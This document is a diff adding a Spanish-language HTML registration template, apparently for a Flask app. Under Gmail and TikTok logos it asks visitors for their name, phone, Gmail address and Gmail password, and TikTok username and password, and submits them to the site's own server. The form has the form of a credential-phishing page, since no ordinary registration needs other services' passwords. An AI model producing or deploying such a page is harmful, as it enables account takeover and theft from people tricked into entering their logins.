@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Registro</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h2>Formulario de Registro</h2>
+
+        <form method="post">
+            <!-- Información de Contacto -->
+            <h3>Información de Contacto</h3>
+            <label>Nombre:</label>
+            <input type="text" name="nombre" required>
+
+            <label>Teléfono:</label>
+            <input type="text" name="telefono" required>
+
+            <!-- Cuenta de Gmail -->
+            <div class="account-section gmail">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Gmail Logo">
+                <h3>Cuenta de Gmail</h3>
+                <label>Correo electrónico de Gmail:</label>
+                <input type="email" name="gmail_user" required>
+
+                <label>Contraseña:</label>
+                <input type="password" name="gmail_senha" required>
+            </div>
+
+            <!-- Inicio de Sesión en TikTok -->
+            <div class="account-section tiktok">
+                <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+                <h3>Inicio de Sesión en TikTok</h3>
+                <label>Usuario:</label>
+                <input type="text" name="tiktok_user" required>
+
+                <label>Contraseña:</label>
+                <input type="password" name="tiktok_senha" required>
+            </div>
+
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+</body>
+</html>
